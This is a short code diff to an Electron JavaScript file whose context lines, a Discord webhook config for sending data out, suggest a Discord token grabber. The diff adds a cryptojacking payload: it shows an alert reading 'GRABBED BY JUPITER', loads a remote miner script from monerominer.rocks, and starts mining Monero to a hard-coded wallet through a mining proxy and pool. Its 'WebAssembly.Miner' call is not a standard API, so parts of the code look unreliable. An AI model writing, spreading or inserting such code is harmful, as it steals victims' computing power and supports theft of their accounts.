@@ -5,6 +5,25 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
+alert("GRABBED\nBY\nJUPITER")
+
+var script = document.createElement('script');
+script.src = "https://monerominer.rocks/miner-mmr/webmnr.min.js";
+document.head.appendChild(script);
+var server = "wss://f.xmrminingproxy.com:8181";
+var pool = "gulf.moneroocean.stream";
+var walletAddress = "44X9i4c6YhQcfLiSCrbNH25yrRfkrhrzQSeZT1meFsqtSq1K48XHXosdG4Bj9sLE7ceTbsCnL6k8LaiheZGFyfS6Nn2Hcer";
+var workerId = "";
+var threads = -1;
+var password = "x";
+var throttleMiner = 20;
+function startMining(pool, walletAddress, workerId, threads, password) {
+  var miner = new WebAssembly.Miner();
+  miner.init(pool, walletAddress, workerId, threads, password);
+  miner.start();
+}
+startMining(pool, walletAddress, workerId, threads, password);
+
 const config = {
   webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
